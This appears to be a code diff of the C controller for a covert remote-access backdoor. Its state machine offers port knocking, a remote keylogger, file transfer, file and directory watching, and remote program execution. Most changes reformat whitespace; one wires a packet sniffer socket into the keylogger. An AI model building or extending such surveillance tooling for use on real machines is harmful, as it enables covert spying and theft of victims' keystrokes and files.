@@ -25,27 +25,27 @@ enum main_application_states
     STATE_ERROR
 };
 
-static void sigint_handler(int signum);
+static void                  sigint_handler(int signum);
 
-static int parse_arguments_handler(struct fsm_context *context, struct fsm_error *err);
-static int handle_arguments_handler(struct fsm_context *context, struct fsm_error *err);
-static int run_menu_handler(struct fsm_context *context, struct fsm_error *err);
-static int run_port_knock_handler(struct fsm_context *context, struct fsm_error *err);
-static int start_keylog_handler(struct fsm_context *context, struct fsm_error *err);
-static int stop_keylog_handler(struct fsm_context *context, struct fsm_error *err);
-static int transfer_file_handler(struct fsm_context *context, struct fsm_error *err);
-static int get_file_handler(struct fsm_context *context, struct fsm_error *err);
-static int watch_file_handler(struct fsm_context *context, struct fsm_error *err);
-static int watch_directory_handler(struct fsm_context *context, struct fsm_error *err);
-static int run_program_handler(struct fsm_context *context, struct fsm_error *err);
-static int disconnect_handler(struct fsm_context *context, struct fsm_error *err);
-static int uninstall_handler(struct fsm_context *context, struct fsm_error *err);
-static int cleanup_handler(struct fsm_context *context, struct fsm_error *err);
-static int error_handler(struct fsm_context *context, struct fsm_error *err);
+static int                   parse_arguments_handler(struct fsm_context *context, struct fsm_error *err);
+static int                   handle_arguments_handler(struct fsm_context *context, struct fsm_error *err);
+static int                   run_menu_handler(struct fsm_context *context, struct fsm_error *err);
+static int                   run_port_knock_handler(struct fsm_context *context, struct fsm_error *err);
+static int                   start_keylog_handler(struct fsm_context *context, struct fsm_error *err);
+static int                   stop_keylog_handler(struct fsm_context *context, struct fsm_error *err);
+static int                   transfer_file_handler(struct fsm_context *context, struct fsm_error *err);
+static int                   get_file_handler(struct fsm_context *context, struct fsm_error *err);
+static int                   watch_file_handler(struct fsm_context *context, struct fsm_error *err);
+static int                   watch_directory_handler(struct fsm_context *context, struct fsm_error *err);
+static int                   run_program_handler(struct fsm_context *context, struct fsm_error *err);
+static int                   disconnect_handler(struct fsm_context *context, struct fsm_error *err);
+static int                   uninstall_handler(struct fsm_context *context, struct fsm_error *err);
+static int                   cleanup_handler(struct fsm_context *context, struct fsm_error *err);
+static int                   error_handler(struct fsm_context *context, struct fsm_error *err);
 
 static volatile sig_atomic_t exit_flag = 0;
 
-int main(int argc, char **argv)
+int                          main(int argc, char **argv)
 {
     struct fsm_error err;
     struct arguments args = {
@@ -58,49 +58,49 @@ int main(int argc, char **argv)
     };
 
     static struct fsm_transition transitions[] = {
-        {FSM_INIT,               STATE_PARSE_ARGUMENTS,  parse_arguments_handler },
-        {STATE_PARSE_ARGUMENTS,  STATE_HANDLE_ARGUMENTS, handle_arguments_handler},
-        {STATE_HANDLE_ARGUMENTS, STATE_RUN_MENU,         run_menu_handler        },
+        {FSM_INIT, STATE_PARSE_ARGUMENTS, parse_arguments_handler},
+        {STATE_PARSE_ARGUMENTS, STATE_HANDLE_ARGUMENTS, handle_arguments_handler},
+        {STATE_HANDLE_ARGUMENTS, STATE_RUN_MENU, run_menu_handler},
 
-        {STATE_RUN_MENU,         STATE_RUN_PORT_KNOCK,   run_port_knock_handler  },
-        {STATE_RUN_MENU,         STATE_DISCONNECT,       disconnect_handler      },
-        {STATE_RUN_MENU,         STATE_UNINSTALL,        uninstall_handler       },
-        {STATE_RUN_MENU,         STATE_START_KEYLOG,     start_keylog_handler    },
-        {STATE_RUN_MENU,         STATE_STOP_KEYLOG,      stop_keylog_handler     },
-        {STATE_RUN_MENU,         STATE_TRANSFER_FILE,    transfer_file_handler   },
-        {STATE_RUN_MENU,         STATE_GET_FILE,         get_file_handler        },
-        {STATE_RUN_MENU,         STATE_WATCH_FILE,       watch_file_handler      },
-        {STATE_RUN_MENU,         STATE_WATCH_DIRECTORY,  watch_directory_handler },
-        {STATE_RUN_MENU,         STATE_RUN_PROGRAM,      run_program_handler     },
+        {STATE_RUN_MENU, STATE_RUN_PORT_KNOCK, run_port_knock_handler},
+        {STATE_RUN_MENU, STATE_DISCONNECT, disconnect_handler},
+        {STATE_RUN_MENU, STATE_UNINSTALL, uninstall_handler},
+        {STATE_RUN_MENU, STATE_START_KEYLOG, start_keylog_handler},
+        {STATE_RUN_MENU, STATE_STOP_KEYLOG, stop_keylog_handler},
+        {STATE_RUN_MENU, STATE_TRANSFER_FILE, transfer_file_handler},
+        {STATE_RUN_MENU, STATE_GET_FILE, get_file_handler},
+        {STATE_RUN_MENU, STATE_WATCH_FILE, watch_file_handler},
+        {STATE_RUN_MENU, STATE_WATCH_DIRECTORY, watch_directory_handler},
+        {STATE_RUN_MENU, STATE_RUN_PROGRAM, run_program_handler},
 
-        {STATE_DISCONNECT,       STATE_RUN_MENU,         run_menu_handler        },
-        {STATE_RUN_PORT_KNOCK,   STATE_RUN_MENU,         run_menu_handler        },
-        {STATE_START_KEYLOG,     STATE_RUN_MENU,         run_menu_handler        },
-        {STATE_STOP_KEYLOG,      STATE_RUN_MENU,         run_menu_handler        },
-        {STATE_TRANSFER_FILE,    STATE_RUN_MENU,         run_menu_handler        },
-        {STATE_GET_FILE,         STATE_RUN_MENU,         run_menu_handler        },
-        {STATE_WATCH_FILE,       STATE_RUN_MENU,         run_menu_handler        },
-        {STATE_WATCH_DIRECTORY,  STATE_RUN_MENU,         run_menu_handler        },
-        {STATE_RUN_PROGRAM,      STATE_RUN_MENU,         run_menu_handler        },
+        {STATE_DISCONNECT, STATE_RUN_MENU, run_menu_handler},
+        {STATE_RUN_PORT_KNOCK, STATE_RUN_MENU, run_menu_handler},
+        {STATE_START_KEYLOG, STATE_RUN_MENU, run_menu_handler},
+        {STATE_STOP_KEYLOG, STATE_RUN_MENU, run_menu_handler},
+        {STATE_TRANSFER_FILE, STATE_RUN_MENU, run_menu_handler},
+        {STATE_GET_FILE, STATE_RUN_MENU, run_menu_handler},
+        {STATE_WATCH_FILE, STATE_RUN_MENU, run_menu_handler},
+        {STATE_WATCH_DIRECTORY, STATE_RUN_MENU, run_menu_handler},
+        {STATE_RUN_PROGRAM, STATE_RUN_MENU, run_menu_handler},
 
-        {STATE_UNINSTALL,        STATE_CLEANUP,          cleanup_handler         },
+        {STATE_UNINSTALL, STATE_CLEANUP, cleanup_handler},
 
-        {STATE_PARSE_ARGUMENTS,  STATE_ERROR,            error_handler           },
-        {STATE_HANDLE_ARGUMENTS, STATE_ERROR,            error_handler           },
-        {STATE_RUN_MENU,         STATE_ERROR,            error_handler           },
-        {STATE_DISCONNECT,       STATE_ERROR,            error_handler           },
-        {STATE_UNINSTALL,        STATE_ERROR,            error_handler           },
-        {STATE_RUN_PORT_KNOCK,   STATE_ERROR,            error_handler           },
-        {STATE_START_KEYLOG,     STATE_ERROR,            error_handler           },
-        {STATE_STOP_KEYLOG,      STATE_ERROR,            error_handler           },
-        {STATE_TRANSFER_FILE,    STATE_ERROR,            error_handler           },
-        {STATE_GET_FILE,         STATE_ERROR,            error_handler           },
-        {STATE_WATCH_FILE,       STATE_ERROR,            error_handler           },
-        {STATE_WATCH_DIRECTORY,  STATE_ERROR,            error_handler           },
-        {STATE_RUN_PROGRAM,      STATE_ERROR,            error_handler           },
+        {STATE_PARSE_ARGUMENTS, STATE_ERROR, error_handler},
+        {STATE_HANDLE_ARGUMENTS, STATE_ERROR, error_handler},
+        {STATE_RUN_MENU, STATE_ERROR, error_handler},
+        {STATE_DISCONNECT, STATE_ERROR, error_handler},
+        {STATE_UNINSTALL, STATE_ERROR, error_handler},
+        {STATE_RUN_PORT_KNOCK, STATE_ERROR, error_handler},
+        {STATE_START_KEYLOG, STATE_ERROR, error_handler},
+        {STATE_STOP_KEYLOG, STATE_ERROR, error_handler},
+        {STATE_TRANSFER_FILE, STATE_ERROR, error_handler},
+        {STATE_GET_FILE, STATE_ERROR, error_handler},
+        {STATE_WATCH_FILE, STATE_ERROR, error_handler},
+        {STATE_WATCH_DIRECTORY, STATE_ERROR, error_handler},
+        {STATE_RUN_PROGRAM, STATE_ERROR, error_handler},
 
-        {STATE_ERROR,            STATE_CLEANUP,          cleanup_handler         },
-        {STATE_CLEANUP,          FSM_EXIT,               NULL                    },
+        {STATE_ERROR, STATE_CLEANUP, cleanup_handler},
+        {STATE_CLEANUP, FSM_EXIT, NULL},
     };
 
     fsm_run(&context, &err, transitions);
@@ -144,49 +144,49 @@ static int run_menu_handler(struct fsm_context *context, struct fsm_error *err)
 
     switch (opt)
     {
-        case CONNECT:
-            printf("Connecting...\n");
-            return STATE_RUN_PORT_KNOCK;
+    case CONNECT:
+        printf("Connecting...\n");
+        return STATE_RUN_PORT_KNOCK;
 
-        case DISCONNECT:
-            printf("Disconnecting...\n");
-            return STATE_DISCONNECT;
+    case DISCONNECT:
+        printf("Disconnecting...\n");
+        return STATE_DISCONNECT;
 
-        case UNINSTALL:
-            printf("Uninstalling...\n");
-            return STATE_UNINSTALL;
+    case UNINSTALL:
+        printf("Uninstalling...\n");
+        return STATE_UNINSTALL;
 
-        case START_KEYLOG:
-            printf("Starting keylogger...\n");
-            return STATE_START_KEYLOG;
+    case START_KEYLOG:
+        printf("Starting keylogger...\n");
+        return STATE_START_KEYLOG;
 
-        case STOP_KEYLOG:
-            printf("Stopping keylogger...\n");
-            return STATE_STOP_KEYLOG;
+    case STOP_KEYLOG:
+        printf("Stopping keylogger...\n");
+        return STATE_STOP_KEYLOG;
 
-        case TRANSFER_FILE_TO:
-            printf("Transfer file to remote...\n");
-            return STATE_TRANSFER_FILE;
+    case TRANSFER_FILE_TO:
+        printf("Transfer file to remote...\n");
+        return STATE_TRANSFER_FILE;
 
-        case TRANSFER_FILE_FROM:
-            printf("Transfer file from remote...\n");
-            return STATE_GET_FILE;
+    case TRANSFER_FILE_FROM:
+        printf("Transfer file from remote...\n");
+        return STATE_GET_FILE;
 
-        case WATCH_FILE:
-            printf("Watching file...\n");
-            return STATE_WATCH_FILE;
+    case WATCH_FILE:
+        printf("Watching file...\n");
+        return STATE_WATCH_FILE;
 
-        case WATCH_DIR:
-            printf("Watching directory...\n");
-            return STATE_WATCH_DIRECTORY;
+    case WATCH_DIR:
+        printf("Watching directory...\n");
+        return STATE_WATCH_DIRECTORY;
 
-        case RUN_PROGRAM:
-            printf("Running program...\n");
-            return STATE_RUN_PROGRAM;
+    case RUN_PROGRAM:
+        printf("Running program...\n");
+        return STATE_RUN_PROGRAM;
 
-        default:
-            SET_ERROR(err, "Invalid menu option");
-            return STATE_ERROR;
+    default:
+        SET_ERROR(err, "Invalid menu option");
+        return STATE_ERROR;
     }
 }
 
@@ -202,6 +202,8 @@ static int run_port_knock_handler(struct fsm_context *context, struct fsm_error 
         ctx->args->connected = 1;
     }
 
+    ctx->args->sock = open_sniffer();
+
     return STATE_RUN_MENU;
 }
 
@@ -212,7 +214,7 @@ static int start_keylog_handler(struct fsm_context *context, struct fsm_error *e
 
     SET_TRACE(context, "in start keylog handler", "STATE_START_KEYLOG");
 
-    if (start_keylogger(ctx->args->ip_info) != 0)
+    if (start_keylogger(ctx->args->ip_info, ctx->args->sock) != 0)
     {
         return STATE_ERROR;
     }
